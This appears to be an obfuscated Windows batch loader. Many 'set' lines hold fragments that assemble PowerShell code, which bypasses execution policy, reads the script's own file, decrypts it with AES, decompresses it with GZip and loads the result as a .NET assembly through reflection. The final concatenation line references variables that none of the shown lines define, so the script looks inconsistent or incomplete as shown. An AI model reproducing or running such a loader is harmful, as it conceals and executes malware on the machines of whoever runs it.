@echo off
set "dCiBKiGxnF= = ["
set "mZncVZAzhC=($NG"
set "jVmCSSfwvP=y.Cr"
set "ohyercNMlU= = N"
set "mMMLqOuroJ=comp"
set "JPRuWmrPgg=[Sys"
set "xNIHXPDaVN=tem."
set "bqaWCbNFYq=.-16"
set "DwXWUyPUUK=bU.D"
set "VcdomDBDMf= '')"
set "aPEMPLUlnX=rG);"
set "xYxDPhDLlw=();$"
set "SQpmTFSVpl=gsYZ"
set "ZXqDmSsoFV=:: '"
set "qUnOzuyGCu=V = "
set "lJmyowsvcG=Disp"
set "SpcmKYargB=; };"
set "yXTnXsvyxq=ach "
set "iizqGtpDsU=oin "
set "mWFsxGxElN=)($R"
set "gYPmZFXNxj=d;$q"
set "DnejXWLToo=yste"
set "MjndaDKlIT=eMVs"
set "cBaYbJNpGA=();$"
set "AtGZxZXemg=Star"
set "FQOuzFXqEL=rlcu"
set "lMKWPGsZOl=G = "
set "ZKNFiUjvkl=k) {"
set "YOTPVNhLbZ=rans"
set "MjGozOuRve=);$q"
set "mfefbxPVee=ress"
set "JjZnjTJhyK=yste"
set "NgyIMqTPzU=and "
set "qqZgQnWSGG=-Obj"
set "uLPJrdEJSG=G = "
set "NVNCGOXbNl=-joi"
set "jsXVsimdtP=qrlc"
set "fTBryEsKNR= '')"
set "KEpVdmSbSV=null"
set "EXNpeQaPCs=7;$q"
set "qSjJTQjHWi=fore"
set "FkrCfUYWcQ= New"
set "CRGPTdUXFh=saBm"
set "TPsYhWTDvI=6esa"
set "laOKjHMjYh=.Com"
set "DuSIrGTsKo=;$PB"
set "TuvRtyaTWB=nirt"
set "MBASCsYvWR=1..-"
set "JFILKwEHEl=.Ass"
set "oXznskuQWa=BC;$"
set "sPEhfQrBcs=ect "
set "EUlXbWZIvD=, $d"
set "lvJhgovjsZ=dYWr"
set "zLdxoeyrSF=oL'["
set "svENgYmHkO=bVeW"
set "dMooNcIHeg=IY, "
set "pJLtfCbIdS=Secu"
set "YsvbBjxlwF=ddin"
set "pdmAsyPsBj=..-1"
set "XLiQfPJevE=esaB"
set "VcYXAOKCHD=USgI"
set "diwRugLqvW=.Len"
set "fSyKdTvRKz=k; }"
set "XGgoupsply=CFxo"
set "ThOdhCqYpO=rity"
set "tlKpquLgHi=grap"
set "JtmlFSHWQw=g = "
set "NyPgfIZutj=[]] "
set "iPrOEJqVdU=;$zT"
set "YBCWICLXGs=orF'"
set "XhPaQycxEn=rt]:"
set "oYmqkKORlR=in $"
set "ykXYXCVUDZ=sion"
set "uKnHCCGBAy=th('"
set "qDBAXzxCSt=morF"
set "VSgPNcSwzC=ak ="
set "XODycIKPDd='[-1"
set "AcNETgwgyV=y.Ci"
set "QpAFOExAuc=oint"
set "SyLMHSVfIE= [Sy"
set "YAmzbvMywL=$djy"
set "yCDvbXfQxY=dj0C"
set "xkbnKeKuXW=Obje"
set "JHieJkgchc=zuZI"
set "mAAdgYJJXx=.Cre"
set "VmmuophXOC=[Env"
set "SpoeCfwoLh=rG ="
set "AvWSkZVDtv=]::("
set "oQqFinDOqy=$dYW"
set "lCwHqVZIVJ=.IO."
set "ewBqURpkKN=pStr"
set "guNswSnyDU=e]::"
set "HZpGReQlaB=am;$"
set "xcaHrpEJnb=.Cry"
set "YUZOboqvmz=3); "
set "aoplkzzFgn=PxEW"
set "FONLmWnsWv=$SRi"
set "PfqwXpswLb=ress"
set "LfTzDMRvrS=rofi"
set "DeOFRDFGRB=Comp"
set "pSrdAdkrpK=gth)"
set "hAWZVQfZwU=  $R"
set "dZEsipwAva=tS46"
set "HXQhnVdvpu= [Sy"
set "HhCpSWvLHB=U = "
set "rzjPOVtiWV=se()"
set "VdfArWQpOl=comm"
set "IVHehzfsXs=]::N"
set "BUmKXPGjxo=O.Me"
set "flwbbhFqNc=('%~f0'"
set "QSetSqApUM=G, 0"
set "QyKPpSYcot=gnir"
set "tOXlMgTcfQ=ring"
set "DXNHuZaqvh=ode]"
set "ODWZymwWpk=ay()"
set "KzzpDlHlCJ=gjYA"
set "EEzAdvekpd=Stre"
set "pxrKDOAsSQ=ke($"
set "XworHoSkwx=dYWr"
set "sijQwGZLiy=PKCS"
set "QDuFVUggId=S46e"
set "LnIjYgBLnK=$zTs"
set "ncyzDiZHbf=trea"
set "JiiBbJzwzw=ateD"
set "UTtLKgXeVH=stem"
set "MKWIsxWpHH=Fina"
set "UydytRbdsC=tem."
set "CZrfJlYBcX=New-"
set "dXeqLhDYUn=ecry"
set "YqWluSQKqi=s75K"
set "EAgIwmPDCY=Comp"
set "aPDvbLeXiF=ptog"
set "mgaybHiheT=GgpW"
set "vFuADUfSYO=rlcu"
set "bFkEHdZdkf=rity"
set "nKjPiRsIKI=[IO."
set "IohLtClGRK=::('"
set "IeEyQRFzxZ=yste"
set "irVDpuJbjf=embl"
set "vcdWkBIoKO=-nop"
set "AbybpmPydr=y]::"
set "VaMuWgXMMf=n ''"
set "ePVnKdnCYn=ress"
set "kUedqeBiRs='txe"
set "xROCJYNzia=form"
set "luxdovkBcB=onve"
set "FoCsViNpBq=);$q"
set "JEmazCrmGi='[-1"
set "tQZRCHsjlX=;$US"
set "fhzXetGDxS=pres"
set "GfEmEuTBiv=-4] "
set "YENfdKoBNj=oArr"
set "okPShgtBKh=;$zT"
set "fLkQNfqUKz=..-1"
set "oRGXrcGFjj=le  "
set "DExoeNKZrQ=raph"
set "ARvKVgeDNL=.Sec"
set "gDFLtVwBXY=oryS"
set "OTyaQRCkMs=Secu"
set "iTHKdzxdvI=6] -"
set "OvcrDcijBl=106u"
set "ntjGrdDscv=pher"
set "zeNMPOYpNe=ment"
set "kERjFYbZCU=]::C"
set "ABJgfTtDJo=ose("
set "CLFYIjniMX=vert"
set "GKGdIKcFNe=m.Re"
set "sQvFHDbYKE=.Con"
set "UanQiMYMNg=d.En"
set "jtajwDWZjV=tryP"
set "cEQigASCra=ddin"
set "REwyNTgQbx=QKz."
set "jBLUUZWMOu=Obje"
set "YCSUfkMveJ=gIY."
set "LvUuHDhoSN=New-"
set "VDlxGawLKi=tsWi"
set "qrmhnWyKJJ=lit("
set "FCYYwfOjGX=[Sys"
set "dqfgwNwNFo=UK);"
set "SpYywplvwU=]::("
set "mAUeCgdbCE=SRib"
set "PMjYYXPhJV=sAF "
set "eRQOgCjskO=Conv"
set "xjBdwZOTED=[-1."
set "CwUJRnvcPX=mory"
set "RWvdbjnucB=rtS4"
set "RLkwvMMKSD=-joi"
set "IHxrCUDiaf=.Cry"
set "QOxPgcoqap=gMod"
set "cUKoibcYZz=pose"
set "KiYjcFzIbE=Invo"
set "YQKnmPilQe=ck($"
set "ghcIgDaTQa=F'[-"
set "YggTCKJnjl=)))"
set "bBdbLDwgFh=ss -"
set "hrtdOcdffe='gni"
set "yHyWruwIFL=, (,"
set "NIwqGaDrqu=dYWr"
set "lGuVlleiNE=RmAx"
set "jQQexaQzTq=($NG"
set "rvMGsbIRPV=ion."
set "UqGcrzarHw=NGwK"
set "YPiOhwfoFN=m.IO"
set "fFEyIuYmOp=ptor"
set "vadGACqyaE=stem"
set "hMqDypcoRZ=zHhH"
set "ADYPJriygu=join"
set "tHHtXbSVYP=e = "
set "osTaJXlXmy=nage"
set "PSoWAYtnwo=ew-O"
set "TZfhPYuhSX=bstr"
set "yPOnMhfIFw==');"
set "TUUCxNnOeu=yTo("
set "xAyAIvxuCV=sAF."
set "HHeikQzAFz=ne);"
set "YhrilWRRRf=ert]"
set "xwqXnRmdTn=File"
set "jCRskdhTuC=('Tg"
set "DbpWZrNGvc=urit"
set "GNxuvTHOoH=('da"
set "KJeGtCnFIs=L4Yi"
set "KhUiSHjWng=$djy"
set "PKdYuEFTRd=hy.A"
set "DdnOCobxXs=] -j"
set "lTnajbqexP=bVeW"
set "LYFMXbdQCJ=[Sys"
set "cvnbGfHqVx=)) {"
set "qShYhbmlGv=ptog"
set "yHLwalrGEU=::De"
set "kFDiLPGoKE=);$d"
set "WnUJKIBabt=u.Pa"
set "rzrvBafuVq=ct S"
set "xOpELrYLXI=-ep "
set "ysQKkekimP=Mode"
set "SxWkWafwgS=Syst"
set "hXrsDVkzns=brea"
set "bVgzBFplcw=em.C"
set "PgZqOuVNAi='0Pg"
set "ukblSrEUDN=.Dis"
set "GOeeDVEXkb=daeR"
set "XcwFcKfzlx=Y = "
set "OCFeyCWdAo=pose"
set "HdebSIgGwy=-1.."
set "ujuaJHqToi=.GZi"
set "epXMTxRdpw=.Mod"
set "AjXiUDvDYV=YxVw"
set "MsNmILewQa=).Sp"
set "vuUhZreohs=tion"
set "KfSkKhzgDb=);$P"
set "pKzCJLSZRu=YWrG"
set "TidVrGyMxo=bjec"
set "jmTpBOywQt=l5E7"
set "ZBYVnwQZzu=1] -"
set "KGGKsSRXsv=stem"
set "sSMhJznjWK=('%*'"
set "yXvsdbAHju=();$"
set "FxEIvmJdcP=y.Pa"
set "aHiYvCpwiV=esMa"
set "MSGYNWMzow=$USg"
set "jYdmNUEMNy=jyUK"
set "patcfIAFuG='')("
set "NtRKCHRzUI=s.Su"
set "LSHWvyqRxV===')"
set "kXiwSMqCvd=YWrG"
set "HgiTaPqjFX= = $"
set "sdIKwzxZOU=ct S"
set "oeVFGsdDVJ=;$Gg"
set "OsLRfdHVDI=.Mem"
set "MbsPauhQSU=)($d"
set "DXLtScjrmw=em.I"
set "RhVujQlcqF=RibU"
set "LRLdIDpQGA=iron"
set "yCdkWYehHn=PTtG"
set "tTYZZcOBwH=ing("
set "jIikeKRjDk=rlcu"
set "daTyZCUNji=$djy"
set "glqgYtnLVY= [st"
set "vadoqzcelS=sKVa"
set "VyfIBxPyaT=t Sy"
set "YsdMJEFdFI=rlcu"
set "IYVtPvBFwe=$dYW"
set "QiAJuwqBLd=m.IO"
set "LxZwJLCXBm=BQKz"
set "CizzxhwJZf=:('g"
set "zpAYddtIIw=flec"
set "gXXQyxnEtb=bypa"
set "AdBqmtNgwr=pWd "
set "aENycLXZuy=wKs "
set "DhIooyFizJ=ewLi"
set "FJcMrsrpzL=.Cop"
set "NyGxJDJvCM=n ''"
set "ivcsHDOOgK=ispo"
set "NTIhaggoyx=UK.T"
set "xyzXGWdnxf=);$S"
set "yjDJuLdMTN=rlcu"
set "MJmOsZdoSQ=cu.I"
%bySFLXIvyb%%VAOMoUzbGN%%yjkiOsDvwP%%tbwjXEqSjN%%jvJZZgsDHj%%pAkWaSoKRs%%tmYIITeEPJ%%DGRTEczkjH%%ZaOnzTRzjf%%qGbRtWxbrf%%cONXFJIrsX%%sdBjstyKiP%%cEvKtWFZzI%%FyTdFlnQHQ%%kAhlMneRza%%xMSBcxsdEJ%%dJRJrTjxEg%%fIdrFCxjXf%%SNAzkTGrbh%%TjlYMBJxUS%%dHmsUOIAWA%%aifyRqirzy%%nRwxnWxeFd%%TZpfckAhFv%%kfvBgKeMhw%%srYwEllPfY%%rEVSHbTawG%%PbLdnhwVrC%%RKXiLBaTAQ%%ZLcHeGkCUf%%ReqBHrFVix%%PqxCgHGMhf%%aZAGGdYeYH%"%~dp0%~nx0.exe"
cls
%jjDgucIhkO%%lIFjCgdWOS%
